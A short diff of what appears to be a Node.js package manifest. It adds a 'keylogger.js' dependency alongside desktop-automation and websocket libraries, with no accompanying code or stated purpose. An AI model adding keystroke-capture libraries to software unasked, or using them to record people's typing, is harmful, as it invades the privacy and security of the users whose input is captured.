@@ -11,6 +11,7 @@
   "description": "",
   "dependencies": {
     "@nut-tree-fork/nut-js": "^4.2.6",
+    "keylogger.js": "^0.0.4",
     "ws": "^8.18.3"
   }
 }
